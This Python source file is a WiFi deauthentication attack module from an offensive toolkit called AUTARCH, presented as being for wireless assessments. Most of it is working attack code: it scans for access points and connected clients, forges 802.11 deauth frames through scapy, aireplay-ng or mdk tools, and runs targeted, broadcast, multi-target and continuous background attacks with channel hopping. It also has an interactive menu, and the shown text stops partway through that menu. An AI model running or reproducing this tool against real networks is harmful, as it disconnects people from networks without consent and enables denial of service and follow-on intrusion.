"""AUTARCH Deauth Attack Module

Targeted and broadcast WiFi deauthentication, multi-target attacks,
continuous mode, channel hopping, and client discovery for wireless
assessments. Designed for Raspberry Pi and SBCs with monitor-mode adapters.
"""

DESCRIPTION = "WiFi deauthentication — targeted & broadcast attacks"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import sys
import json
import time
import shutil
import signal
import struct
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    def find_tool(name):
        return shutil.which(name)
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')

sys.path.insert(0, str(Path(__file__).parent.parent))
try:
    from core.banner import Colors, clear_screen, display_banner
except ImportError:
    class Colors:
        RED = YELLOW = GREEN = CYAN = WHITE = DIM = RESET = BOLD = MAGENTA = ""
    def clear_screen(): pass
    def display_banner(): pass


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None

def get_deauth():
    """Return singleton DeauthAttack instance."""
    global _instance
    if _instance is None:
        _instance = DeauthAttack()
    return _instance


# ── Helpers ──────────────────────────────────────────────────────────────────

MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
BROADCAST = 'FF:FF:FF:FF:FF:FF'


def _validate_mac(mac: str) -> bool:
    return bool(MAC_RE.match(mac))


def _run(cmd, timeout=30) -> tuple:
    """Run a command, return (success, stdout)."""
    try:
        result = subprocess.run(
            cmd, shell=isinstance(cmd, str),
            capture_output=True, text=True, timeout=timeout
        )
        return result.returncode == 0, result.stdout.strip()
    except subprocess.TimeoutExpired:
        return False, 'Command timed out'
    except Exception as e:
        return False, str(e)


def _run_bg(cmd) -> Optional[subprocess.Popen]:
    """Start a background process, return Popen or None."""
    try:
        proc = subprocess.Popen(
            cmd, shell=isinstance(cmd, str),
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True
        )
        return proc
    except Exception:
        return None


# ── DeauthAttack Class ───────────────────────────────────────────────────────

class DeauthAttack:
    """WiFi deauthentication attack toolkit."""

    def __init__(self):
        # Data directory
        data_root = get_data_dir()
        if isinstance(data_root, Path):
            data_root = str(data_root)
        self.data_dir = os.path.join(data_root, 'deauth')
        os.makedirs(self.data_dir, exist_ok=True)

        self.history_path = os.path.join(self.data_dir, 'history.json')

        # Tool paths
        self.aireplay = find_tool('aireplay-ng') or shutil.which('aireplay-ng')
        self.airmon = find_tool('airmon-ng') or shutil.which('airmon-ng')
        self.airodump = find_tool('airodump-ng') or shutil.which('airodump-ng')
        self.mdk3 = find_tool('mdk3') or shutil.which('mdk3')
        self.mdk4 = find_tool('mdk4') or shutil.which('mdk4')
        self.iw = shutil.which('iw')
        self.ip_cmd = shutil.which('ip')
        self.iwconfig = shutil.which('iwconfig')

        # Scapy availability
        self._scapy = None
        try:
            from scapy.all import (
                Dot11, Dot11Deauth, RadioTap, sendp, sniff, conf
            )
            self._scapy = True
        except ImportError:
            self._scapy = False

        # Attack state
        self._continuous_thread: Optional[threading.Thread] = None
        self._continuous_running = False
        self._continuous_target = {}
        self._continuous_frames_sent = 0
        self._continuous_start_time = 0.0

        # Channel hopping state
        self._hop_thread: Optional[threading.Thread] = None
        self._hop_running = False
        self._current_channel = 0

        # Attack history
        self._history: List[Dict] = []
        self._load_history()

    # ── Tool Status ──────────────────────────────────────────────────────

    def get_tools_status(self) -> Dict[str, Any]:
        """Return availability of all tools used by this module."""
        return {
            'aireplay-ng': self.aireplay is not None,
            'airmon-ng': self.airmon is not None,
            'airodump-ng': self.airodump is not None,
            'mdk3': self.mdk3 is not None,
            'mdk4': self.mdk4 is not None,
            'iw': self.iw is not None,
            'ip': self.ip_cmd is not None,
            'iwconfig': self.iwconfig is not None,
            'scapy': self._scapy is True,
        }

    # ── Interface Management ─────────────────────────────────────────────

    def get_interfaces(self) -> List[Dict]:
        """List wireless interfaces with mode info."""
        interfaces = []

        # Try iw dev first
        if self.iw:
            try:
                out = subprocess.check_output(
                    [self.iw, 'dev'], text=True, timeout=5
                )
                iface = None
                for line in out.splitlines():
                    line = line.strip()
                    if line.startswith('Interface'):
                        if iface:
                            interfaces.append(iface)
                        iface = {
                            'name': line.split()[-1],
                            'mode': 'managed',
                            'channel': 0,
                            'mac': '',
                            'phy': ''
                        }
                    elif iface:
                        if line.startswith('type'):
                            iface['mode'] = line.split()[-1]
                        elif line.startswith('channel'):
                            try:
                                iface['channel'] = int(line.split()[1])
                            except (ValueError, IndexError):
                                pass
                        elif line.startswith('addr'):
                            iface['mac'] = line.split()[-1]
                if iface:
                    interfaces.append(iface)
            except Exception:
                pass

        # Fallback to iwconfig
        if not interfaces and self.iwconfig:
            try:
                out = subprocess.check_output(
                    [self.iwconfig], text=True,
                    stderr=subprocess.DEVNULL, timeout=5
                )
                for block in out.split('\n\n'):
                    if 'IEEE 802.11' in block or 'ESSID' in block:
                        name = block.split()[0]
                        mode = 'managed'
                        if 'Mode:Monitor' in block:
                            mode = 'monitor'
                        elif 'Mode:Master' in block:
                            mode = 'master'
                        ch_m = re.search(r'Channel[:\s]*(\d+)', block)
                        ch = int(ch_m.group(1)) if ch_m else 0
                        mac_m = re.search(
                            r'HWaddr\s+([\da-fA-F:]{17})', block
                        )
                        mac = mac_m.group(1) if mac_m else ''
                        interfaces.append({
                            'name': name, 'mode': mode,
                            'channel': ch, 'mac': mac, 'phy': ''
                        })
            except Exception:
                pass

        # Last resort: /sys/class/net
        if not interfaces:
            try:
                sys_net = Path('/sys/class/net')
                if sys_net.exists():
                    for d in sys_net.iterdir():
                        if (d / 'wireless').exists() or (d / 'phy80211').exists():
                            interfaces.append({
                                'name': d.name, 'mode': 'unknown',
                                'channel': 0, 'mac': '', 'phy': ''
                            })
            except Exception:
                pass

        return interfaces

    def enable_monitor(self, interface: str) -> Dict:
        """Put interface into monitor mode.

        Tries airmon-ng first, falls back to iw.
        Returns dict with ok, interface (monitor name), and message.
        """
        if not interface:
            return {'ok': False, 'error': 'No interface specified'}

        # Try airmon-ng
        if self.airmon:
            try:
                # Kill interfering processes
                subprocess.run(
                    [self.airmon, 'check', 'kill'],
                    capture_output=True, text=True, timeout=10
                )
                result = subprocess.run(
                    [self.airmon, 'start', interface],
                    capture_output=True, text=True, timeout=15
                )
                output = result.stdout + result.stderr
                # Detect the monitor interface name
                mon_match = re.search(
                    r'\(monitor mode (?:vif )?enabled(?: on| for) \[?(\w+)\]?\)',
                    output
                )
                if mon_match:
                    mon_iface = mon_match.group(1)
                elif os.path.isdir(f'/sys/class/net/{interface}mon'):
                    mon_iface = f'{interface}mon'
                else:
                    mon_iface = interface

                return {
                    'ok': True,
                    'interface': mon_iface,
                    'message': f'Monitor mode enabled on {mon_iface}'
                }
            except Exception as e:
                return {'ok': False, 'error': f'airmon-ng failed: {e}'}

        # Fallback: iw
        if self.iw and self.ip_cmd:
            try:
                subprocess.run(
                    [self.ip_cmd, 'link', 'set', interface, 'down'],
                    capture_output=True, timeout=5
                )
                result = subprocess.run(
                    [self.iw, 'dev', interface, 'set', 'type', 'monitor'],
                    capture_output=True, text=True, timeout=5
                )
                subprocess.run(
                    [self.ip_cmd, 'link', 'set', interface, 'up'],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0:
                    return {
                        'ok': True,
                        'interface': interface,
                        'message': f'Monitor mode enabled on {interface} (via iw)'
                    }
                return {'ok': False, 'error': result.stderr.strip() or 'iw set monitor failed'}
            except Exception as e:
                return {'ok': False, 'error': f'iw failed: {e}'}

        return {'ok': False, 'error': 'No tool available (need airmon-ng or iw+ip)'}

    def disable_monitor(self, interface: str) -> Dict:
        """Restore interface to managed mode."""
        if not interface:
            return {'ok': False, 'error': 'No interface specified'}

        # Try airmon-ng
        if self.airmon:
            try:
                result = subprocess.run(
                    [self.airmon, 'stop', interface],
                    capture_output=True, text=True, timeout=15
                )
                output = result.stdout + result.stderr
                managed_match = re.search(
                    r'\(monitor mode disabled(?: on)? (\w+)\)', output
                )
                managed_name = managed_match.group(1) if managed_match else interface.replace('mon', '')
                return {
                    'ok': True,
                    'interface': managed_name,
                    'message': f'Managed mode restored on {managed_name}'
                }
            except Exception as e:
                return {'ok': False, 'error': f'airmon-ng stop failed: {e}'}

        # Fallback: iw
        if self.iw and self.ip_cmd:
            try:
                subprocess.run(
                    [self.ip_cmd, 'link', 'set', interface, 'down'],
                    capture_output=True, timeout=5
                )
                result = subprocess.run(
                    [self.iw, 'dev', interface, 'set', 'type', 'managed'],
                    capture_output=True, text=True, timeout=5
                )
                subprocess.run(
                    [self.ip_cmd, 'link', 'set', interface, 'up'],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0:
                    return {
                        'ok': True,
                        'interface': interface,
                        'message': f'Managed mode restored on {interface}'
                    }
                return {'ok': False, 'error': result.stderr.strip() or 'iw set managed failed'}
            except Exception as e:
                return {'ok': False, 'error': f'iw failed: {e}'}

        return {'ok': False, 'error': 'No tool available'}

    # ── Scanning ─────────────────────────────────────────────────────────

    def scan_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """Passive scan for access points.

        Uses airodump-ng CSV output or scapy sniffing.
        Returns list of dicts: bssid, ssid, channel, encryption, signal, clients_count.
        """
        if not interface:
            return []

        networks = []

        # Method 1: airodump-ng
        if self.airodump:
            tmp_prefix = os.path.join(self.data_dir, f'scan_{int(time.time())}')
            try:
                proc = subprocess.Popen(
                    [self.airodump, '--write', tmp_prefix,
                     '--output-format', 'csv', '--write-interval', '1',
                     interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(min(duration, 120))
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()

                # Parse CSV
                csv_path = f'{tmp_prefix}-01.csv'
                if os.path.isfile(csv_path):
                    networks = self._parse_airodump_csv(csv_path)
                    # Clean up temp files
                    for f in Path(self.data_dir).glob(
                        f'scan_{os.path.basename(tmp_prefix).replace("scan_", "")}*'
                    ):
                        try:
                            f.unlink()
                        except Exception:
                            pass
            except Exception:
                pass

        # Method 2: scapy fallback
        if not networks and self._scapy:
            networks = self._scan_scapy(interface, duration)

        return networks

    def _parse_airodump_csv(self, csv_path: str) -> List[Dict]:
        """Parse airodump-ng CSV output into network list."""
        networks = []
        clients_map: Dict[str, int] = {}
        section = 'ap'

        try:
            with open(csv_path, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith('Station MAC'):
                        section = 'client'
                        continue
                    if line.startswith('BSSID') or line.startswith('\x00'):
                        continue

                    parts = [p.strip() for p in line.split(',')]

                    if section == 'ap' and len(parts) >= 14:
                        bssid = parts[0]
                        if not _validate_mac(bssid):
                            continue
                        channel = 0
                        try:
                            channel = int(parts[3])
                        except (ValueError, IndexError):
                            pass
                        signal = -100
                        try:
                            signal = int(parts[8])
                        except (ValueError, IndexError):
                            pass
                        encryption = parts[5] if len(parts) > 5 else ''
                        ssid = parts[13] if len(parts) > 13 else ''
                        networks.append({
                            'bssid': bssid,
                            'ssid': ssid,
                            'channel': channel,
                            'encryption': encryption,
                            'signal': signal,
                            'clients_count': 0
                        })

                    elif section == 'client' and len(parts) >= 6:
                        client_mac = parts[0]
                        ap_bssid = parts[5] if len(parts) > 5 else ''
                        if _validate_mac(ap_bssid):
                            clients_map[ap_bssid] = clients_map.get(ap_bssid, 0) + 1

            # Merge client counts
            for net in networks:
                net['clients_count'] = clients_map.get(net['bssid'], 0)

        except Exception:
            pass

        return networks

    def _scan_scapy(self, interface: str, duration: int) -> List[Dict]:
        """Scan using scapy beacon sniffing."""
        networks = {}
        try:
            from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff

            def handler(pkt):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2
                    if not bssid or bssid in networks:
                        return
                    ssid = ''
                    channel = 0
                    enc = 'OPEN'
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 0:  # SSID
                            try:
                                ssid = elt.info.decode('utf-8', errors='replace')
                            except Exception:
                                ssid = ''
                        elif elt.ID == 3:  # DS Parameter Set (channel)
                            try:
                                channel = int(elt.info[0])
                            except Exception:
                                pass
                        elt = elt.payload.getlayer(Dot11Elt)

                    cap = pkt.sprintf('{Dot11Beacon:%Dot11Beacon.cap%}')
                    if 'privacy' in cap:
                        enc = 'WPA/WPA2'

                    try:
                        sig = -(256 - ord(pkt.notdecoded[-4:-3]))
                    except Exception:
                        sig = -100

                    networks[bssid] = {
                        'bssid': bssid,
                        'ssid': ssid,
                        'channel': channel,
                        'encryption': enc,
                        'signal': sig,
                        'clients_count': 0
                    }

            sniff(iface=interface, prn=handler, timeout=duration, store=False)
        except Exception:
            pass

        return list(networks.values())

    def scan_clients(self, interface: str, target_bssid: Optional[str] = None,
                     duration: int = 10) -> List[Dict]:
        """Discover client-AP associations.

        Returns list of dicts: client_mac, ap_bssid, ap_ssid, signal, packets.
        """
        if not interface:
            return []

        clients = []

        # Method 1: airodump-ng with optional BSSID filter
        if self.airodump:
            tmp_prefix = os.path.join(self.data_dir, f'clients_{int(time.time())}')
            cmd = [
                self.airodump, '--write', tmp_prefix,
                '--output-format', 'csv', '--write-interval', '1'
            ]
            if target_bssid and _validate_mac(target_bssid):
                cmd += ['--bssid', target_bssid]
            cmd.append(interface)

            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(min(duration, 120))
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()

                csv_path = f'{tmp_prefix}-01.csv'
                if os.path.isfile(csv_path):
                    clients = self._parse_clients_csv(csv_path, target_bssid)
                    for f in Path(self.data_dir).glob(
                        f'clients_{os.path.basename(tmp_prefix).replace("clients_", "")}*'
                    ):
                        try:
                            f.unlink()
                        except Exception:
                            pass
            except Exception:
                pass

        # Method 2: scapy fallback
        if not clients and self._scapy:
            clients = self._scan_clients_scapy(interface, target_bssid, duration)

        return clients

    def _parse_clients_csv(self, csv_path: str,
                           target_bssid: Optional[str] = None) -> List[Dict]:
        """Parse airodump CSV for client associations."""
        clients = []
        ap_names: Dict[str, str] = {}
        section = 'ap'

        try:
            with open(csv_path, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith('Station MAC'):
                        section = 'client'
                        continue
                    if line.startswith('BSSID'):
                        continue

                    parts = [p.strip() for p in line.split(',')]

                    if section == 'ap' and len(parts) >= 14:
                        bssid = parts[0]
                        ssid = parts[13] if len(parts) > 13 else ''
                        if _validate_mac(bssid):
                            ap_names[bssid] = ssid

                    elif section == 'client' and len(parts) >= 6:
                        client_mac = parts[0]
                        if not _validate_mac(client_mac):
                            continue
                        ap_bssid = parts[5] if len(parts) > 5 else ''
                        if not _validate_mac(ap_bssid):
                            continue
                        if target_bssid and ap_bssid.upper() != target_bssid.upper():
                            continue

                        signal = -100
                        try:
                            signal = int(parts[3])
                        except (ValueError, IndexError):
                            pass
                        packets = 0
                        try:
                            packets = int(parts[4])
                        except (ValueError, IndexError):
                            pass

                        clients.append({
                            'client_mac': client_mac,
                            'ap_bssid': ap_bssid,
                            'ap_ssid': ap_names.get(ap_bssid, ''),
                            'signal': signal,
                            'packets': packets
                        })
        except Exception:
            pass

        return clients

    def _scan_clients_scapy(self, interface: str,
                            target_bssid: Optional[str],
                            duration: int) -> List[Dict]:
        """Discover clients using scapy."""
        seen: Dict[str, Dict] = {}
        try:
            from scapy.all import Dot11, sniff

            def handler(pkt):
                if not pkt.haslayer(Dot11):
                    return
                d11 = pkt[Dot11]
                # Data or management frames — addr1=dest, addr2=src, addr3=bssid
                src = d11.addr2
                dst = d11.addr1
                bssid = d11.addr3
                if not src or not bssid:
                    return
                if src == bssid or src == BROADCAST.lower():
                    return
                if target_bssid and bssid.upper() != target_bssid.upper():
                    return
                key = f'{src}_{bssid}'
                if key not in seen:
                    seen[key] = {
                        'client_mac': src,
                        'ap_bssid': bssid,
                        'ap_ssid': '',
                        'signal': -100,
                        'packets': 0
                    }
                seen[key]['packets'] += 1

            sniff(iface=interface, prn=handler, timeout=duration, store=False)
        except Exception:
            pass

        return list(seen.values())

    # ── Deauthentication Attacks ─────────────────────────────────────────

    def deauth_targeted(self, interface: str, target_bssid: str,
                        client_mac: str, count: int = 10,
                        interval: float = 0.1) -> Dict:
        """Send deauth frames to a specific client on a specific AP.

        Uses aireplay-ng or scapy Dot11Deauth as fallback.
        Returns stats dict.
        """
        if not _validate_mac(target_bssid):
            return {'ok': False, 'error': 'Invalid target BSSID'}
        if not _validate_mac(client_mac):
            return {'ok': False, 'error': 'Invalid client MAC'}
        count = max(1, min(count, 99999))

        start_ts = time.time()
        frames_sent = 0

        # Method 1: aireplay-ng
        if self.aireplay:
            try:
                result = subprocess.run(
                    [self.aireplay, '-0', str(count),
                     '-a', target_bssid, '-c', client_mac, interface],
                    capture_output=True, text=True,
                    timeout=max(30, count * interval * 2 + 10)
                )
                output = result.stdout + result.stderr
                sent_match = re.search(r'(\d+)\s+(?:ACKs|packets)', output)
                if sent_match:
                    frames_sent = int(sent_match.group(1))
                else:
                    frames_sent = count
            except subprocess.TimeoutExpired:
                frames_sent = count
            except Exception as e:
                return {'ok': False, 'error': f'aireplay-ng failed: {e}'}

        # Method 2: scapy
        elif self._scapy:
            frames_sent = self._deauth_scapy(
                interface, target_bssid, client_mac, count, interval
            )

        # Method 3: mdk4 / mdk3
        elif self.mdk4 or self.mdk3:
            tool = self.mdk4 or self.mdk3
            frames_sent = self._deauth_mdk(
                tool, interface, target_bssid, client_mac, count
            )
        else:
            return {'ok': False, 'error': 'No deauth tool available (need aireplay-ng, scapy, or mdk3/mdk4)'}

        elapsed = round(time.time() - start_ts, 2)
        record = {
            'timestamp': datetime.now().isoformat(),
            'target_bssid': target_bssid,
            'client_mac': client_mac,
            'mode': 'targeted',
            'count': count,
            'frames_sent': frames_sent,
            'duration': elapsed,
            'interface': interface
        }
        self._add_history(record)

        return {
            'ok': True,
            'mode': 'targeted',
            'target_bssid': target_bssid,
            'client_mac': client_mac,
            'frames_sent': frames_sent,
            'duration': elapsed
        }

    def deauth_broadcast(self, interface: str, target_bssid: str,
                         count: int = 10, interval: float = 0.1) -> Dict:
        """Broadcast deauth to all clients on an AP."""
        return self.deauth_targeted(
            interface, target_bssid, BROADCAST, count, interval
        )

    def deauth_multi(self, interface: str, targets: List[Dict],
                     count: int = 10, interval: float = 0.1) -> Dict:
        """Deauth multiple AP/client pairs.

        targets: list of {bssid, client_mac}
        """
        if not targets:
            return {'ok': False, 'error': 'No targets specified'}

        results = []
        total_frames = 0

        for t in targets:
            bssid = t.get('bssid', '')
            client = t.get('client_mac', BROADCAST)
            if not client:
                client = BROADCAST
            r = self.deauth_targeted(interface, bssid, client, count, interval)
            results.append(r)
            if r.get('ok'):
                total_frames += r.get('frames_sent', 0)

        return {
            'ok': True,
            'mode': 'multi',
            'targets_count': len(targets),
            'total_frames': total_frames,
            'results': results
        }

    def _deauth_scapy(self, interface: str, bssid: str, client: str,
                      count: int, interval: float) -> int:
        """Send deauth using scapy."""
        frames_sent = 0
        try:
            from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

            # Deauth from AP to client
            pkt_ap = (RadioTap() /
                      Dot11(addr1=client, addr2=bssid, addr3=bssid) /
                      Dot11Deauth(reason=7))
            # Deauth from client to AP
            pkt_cl = (RadioTap() /
                      Dot11(addr1=bssid, addr2=client, addr3=bssid) /
                      Dot11Deauth(reason=7))

            for _ in range(count):
                sendp(pkt_ap, iface=interface, count=1, verbose=False)
                sendp(pkt_cl, iface=interface, count=1, verbose=False)
                frames_sent += 2
                if interval > 0:
                    time.sleep(interval)

        except Exception:
            pass
        return frames_sent

    def _deauth_mdk(self, tool: str, interface: str, bssid: str,
                    client: str, count: int) -> int:
        """Send deauth using mdk3/mdk4."""
        # Create a target file for mdk
        target_file = os.path.join(self.data_dir, 'mdk_targets.txt')
        try:
            with open(target_file, 'w') as f:
                f.write(f'{bssid}\n')

            result = subprocess.run(
                [tool, interface, 'd', '-b', target_file, '-c', str(count)],
                capture_output=True, text=True, timeout=max(30, count + 10)
            )
            return count  # mdk does not reliably report frame count
        except Exception:
            return 0
        finally:
            try:
                os.unlink(target_file)
            except Exception:
                pass

    # ── Continuous Mode ──────────────────────────────────────────────────

    def start_continuous(self, interface: str, target_bssid: str,
                         client_mac: Optional[str] = None,
                         interval: float = 0.5,
                         burst: int = 5) -> Dict:
        """Start continuous deauth in a background thread.

        Sends `burst` deauth frames every `interval` seconds.
        """
        if self._continuous_running:
            return {'ok': False, 'error': 'Continuous attack already running'}
        if not _validate_mac(target_bssid):
            return {'ok': False, 'error': 'Invalid target BSSID'}
        if client_mac and not _validate_mac(client_mac):
            return {'ok': False, 'error': 'Invalid client MAC'}

        client = client_mac or BROADCAST
        interval = max(0.05, min(interval, 60.0))
        burst = max(1, min(burst, 1000))

        self._continuous_running = True
        self._continuous_frames_sent = 0
        self._continuous_start_time = time.time()
        self._continuous_target = {
            'interface': interface,
            'target_bssid': target_bssid,
            'client_mac': client,
            'interval': interval,
            'burst': burst
        }

        def _worker():
            while self._continuous_running:
                r = self.deauth_targeted(
                    interface, target_bssid, client, burst, 0
                )
                if r.get('ok'):
                    self._continuous_frames_sent += r.get('frames_sent', 0)
                time.sleep(interval)

        self._continuous_thread = threading.Thread(
            target=_worker, daemon=True, name='deauth-continuous'
        )
        self._continuous_thread.start()

        return {
            'ok': True,
            'message': f'Continuous deauth started against {target_bssid}',
            'mode': 'broadcast' if client == BROADCAST else 'targeted'
        }

    def stop_continuous(self) -> Dict:
        """Stop continuous deauth attack."""
        if not self._continuous_running:
            return {'ok': False, 'error': 'No continuous attack running'}

        self._continuous_running = False
        if self._continuous_thread:
            self._continuous_thread.join(timeout=5)
            self._continuous_thread = None

        elapsed = round(time.time() - self._continuous_start_time, 2)
        frames = self._continuous_frames_sent

        record = {
            'timestamp': datetime.now().isoformat(),
            'target_bssid': self._continuous_target.get('target_bssid', ''),
            'client_mac': self._continuous_target.get('client_mac', ''),
            'mode': 'continuous',
            'count': frames,
            'frames_sent': frames,
            'duration': elapsed,
            'interface': self._continuous_target.get('interface', '')
        }
        self._add_history(record)

        return {
            'ok': True,
            'message': 'Continuous attack stopped',
            'frames_sent': frames,
            'duration': elapsed
        }

    def is_attacking(self) -> bool:
        """Check if continuous attack is running."""
        return self._continuous_running

    def get_attack_status(self) -> Dict:
        """Return current attack state."""
        if not self._continuous_running:
            return {
                'running': False,
                'target_bssid': '',
                'client_mac': '',
                'frames_sent': 0,
                'duration': 0,
                'mode': 'idle'
            }

        elapsed = round(time.time() - self._continuous_start_time, 2)
        client = self._continuous_target.get('client_mac', BROADCAST)
        mode = 'broadcast' if client == BROADCAST else 'targeted'

        return {
            'running': True,
            'target_bssid': self._continuous_target.get('target_bssid', ''),
            'client_mac': client,
            'frames_sent': self._continuous_frames_sent,
            'duration': elapsed,
            'mode': mode,
            'interval': self._continuous_target.get('interval', 0),
            'burst': self._continuous_target.get('burst', 0)
        }

    # ── Channel Control ──────────────────────────────────────────────────

    def set_channel(self, interface: str, channel: int) -> Dict:
        """Set interface to a specific wireless channel."""
        channel = max(1, min(channel, 196))

        if self.iw:
            ok, out = _run([self.iw, 'dev', interface, 'set', 'channel', str(channel)])
            if ok:
                self._current_channel = channel
                return {'ok': True, 'channel': channel, 'message': f'Set channel {channel}'}
            return {'ok': False, 'error': out or f'Failed to set channel {channel}'}

        if self.iwconfig:
            ok, out = _run([self.iwconfig, interface, 'channel', str(channel)])
            if ok:
                self._current_channel = channel
                return {'ok': True, 'channel': channel, 'message': f'Set channel {channel}'}
            return {'ok': False, 'error': out or f'Failed to set channel {channel}'}

        return {'ok': False, 'error': 'No tool available (need iw or iwconfig)'}

    def channel_hop(self, interface: str, channels: Optional[List[int]] = None,
                    dwell: float = 0.5) -> Dict:
        """Start channel hopping in a background thread.

        Default channels: 1-14 (2.4 GHz).
        """
        if self._hop_running:
            return {'ok': False, 'error': 'Channel hopping already active'}
        if not interface:
            return {'ok': False, 'error': 'No interface specified'}

        if not channels:
            channels = list(range(1, 15))
        dwell = max(0.1, min(dwell, 30.0))

        self._hop_running = True

        def _hop_worker():
            idx = 0
            while self._hop_running:
                ch = channels[idx % len(channels)]
                self.set_channel(interface, ch)
                idx += 1
                time.sleep(dwell)

        self._hop_thread = threading.Thread(
            target=_hop_worker, daemon=True, name='deauth-channel-hop'
        )
        self._hop_thread.start()

        return {
            'ok': True,
            'message': f'Channel hopping started on {interface}',
            'channels': channels,
            'dwell': dwell
        }

    def stop_channel_hop(self) -> Dict:
        """Stop channel hopping."""
        if not self._hop_running:
            return {'ok': False, 'error': 'Channel hopping not active'}

        self._hop_running = False
        if self._hop_thread:
            self._hop_thread.join(timeout=5)
            self._hop_thread = None

        return {'ok': True, 'message': 'Channel hopping stopped'}

    # ── History ──────────────────────────────────────────────────────────

    def get_attack_history(self) -> List[Dict]:
        """Return past attacks with timestamps and stats."""
        return list(self._history)

    def clear_history(self) -> Dict:
        """Clear attack history."""
        self._history = []
        self._save_history()
        return {'ok': True, 'message': 'History cleared'}

    def _add_history(self, record: Dict):
        """Append an attack record and persist."""
        self._history.append(record)
        # Keep last 500 entries
        if len(self._history) > 500:
            self._history = self._history[-500:]
        self._save_history()

    def _load_history(self):
        """Load history from disk."""
        try:
            if os.path.isfile(self.history_path):
                with open(self.history_path, 'r') as f:
                    self._history = json.load(f)
        except Exception:
            self._history = []

    def _save_history(self):
        """Persist history to disk."""
        try:
            with open(self.history_path, 'w') as f:
                json.dump(self._history, f, indent=2)
        except Exception:
            pass

    # ── CLI Runner ───────────────────────────────────────────────────────

    def print_status(self, message: str, status: str = "info"):
        colors = {
            "info": Colors.CYAN, "success": Colors.GREEN,
            "warning": Colors.YELLOW, "error": Colors.RED
        }
        symbols = {"info": "*", "success": "+", "warning": "!", "error": "X"}
        print(f"{colors.get(status, Colors.WHITE)}"
              f"[{symbols.get(status, '*')}] {message}{Colors.RESET}")


def run():
    """CLI entry point for the deauth module."""
    clear_screen()
    display_banner()
    deauth = get_deauth()

    # Show tool status
    tools = deauth.get_tools_status()
    available = [k for k, v in tools.items() if v]
    missing = [k for k, v in tools.items() if not v]
    deauth.print_status(f"Available tools: {', '.join(available) if available else 'none'}", "info")
    if missing:
        deauth.print_status(f"Missing tools: {', '.join(missing)}", "warning")
    print()

    selected_iface = None
    selected_bssid = None
    selected_client = None

    while True:
        print(f"\n{Colors.BOLD}{Colors.RED}=== Deauth Attack ==={Colors.RESET}")
        print(f"  Interface: {Colors.CYAN}{selected_iface or 'none'}{Colors.RESET}")
        print(f"  Target AP: {Colors.CYAN}{selected_bssid or 'none'}{Colors.RESET}")
        print(f"  Client:    {Colors.CYAN}{selected_client or 'broadcast'}{Colors.RESET}")
        if deauth.is_attacking():
            status = deauth.get_attack_status()
            print(f"  {Colors.RED}[ATTACKING]{Colors.RESET} "
                  f"{status['frames_sent']} frames / {status['duration']}s")
        print()
        print(f"  {Colors.GREEN}1{Colors.RESET} - Select Interface")
        print(f"  {Colors.GREEN}2{Colors.RESET} - Scan Networks")
        print(f"  {Colors.GREEN}3{Colors.RESET} - Scan Clients")
        print(f"  {Colors.GREEN}4{Colors.RESET} - Targeted Deauth")
        print(f"  {Colors.GREEN}5{Colors.RESET} - Broadcast Deauth")
        print(f"  {Colors.GREEN}6{Colors.RESET} - Continuous Mode")
        print(f"  {Colors.GREEN}7{Colors.RESET} - Stop Attack")
        print(f"  {Colors.GREEN}8{Colors.RESET} - Set Channel")
        print(f"  {Colors.GREEN}0{Colors.RESET} - Back")
        print()

        choice = input(f"{Colors.BOLD}Choice > {Colors.RESET}").strip()

        if choice == '0':
            if deauth.is_attacking():
                deauth.stop_continuous()
                deauth.print_status("Stopped continuous attack", "warning")
            break

        elif choice == '1':
            ifaces = deauth.get_interfaces()
            if not ifaces:
                deauth.print_status("No wireless interfaces found", "error")
                continue
            print(f"\n{'#':<4} {'Interface':<15} {'Mode':<12} {'Channel':<8} {'MAC'}")
            for i, ifc in enumerate(ifaces):
                print(f"{i+1:<4} {ifc['name']:<15} {ifc['mode']:<12} "
                      f"{ifc['channel']:<8} {ifc['mac']}")
            sel = input(f"\nSelect interface (1-{len(ifaces)}): ").strip()
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(ifaces):
                    selected_iface = ifaces[idx]['name']
                    deauth.print_status(f"Selected: {selected_iface}", "success")
                    if ifaces[idx]['mode'] != 'monitor':
                        en = input("Enable monitor mode? (y/n): ").strip().lower()
                        if en == 'y':
                            r = deauth.enable_monitor(selected_iface)
                            if r['ok']:
                                selected_iface = r['interface']
                                deauth.print_status(r['message'], "success")
                            else:
                                deauth.print_status(r['error'], "error")
            except ValueError:
                pass

        elif choice == '2':
            if not selected_iface:
                deauth.print_status("Select an interface first", "warning")
                continue
            dur = input("Scan duration (seconds) [10]: ").strip()
            dur = int(dur) if dur.isdigit() else 10
            deauth.print_status(f"Scanning for {dur}s on {selected_iface}...", "info")
            nets = deauth.scan_networks(selected_iface, dur)
            if not nets:
                deauth.print_status("No networks found", "warning")
                continue
            print(f"\n{'#':<4} {'BSSID':<20} {'SSID':<25} {'CH':<5} "
                  f"{'Enc':<12} {'Sig':<6} {'Clients'}")
            for i, n in enumerate(nets):
                print(f"{i+1:<4} {n['bssid']:<20} {n['ssid']:<25} "
                      f"{n['channel']:<5} {n['encryption']:<12} "
                      f"{n['signal']:<6} {n['clients_count']}")
            sel = input(f"\nSelect target AP (1-{len(nets)}, Enter to skip): ").strip()
            try:
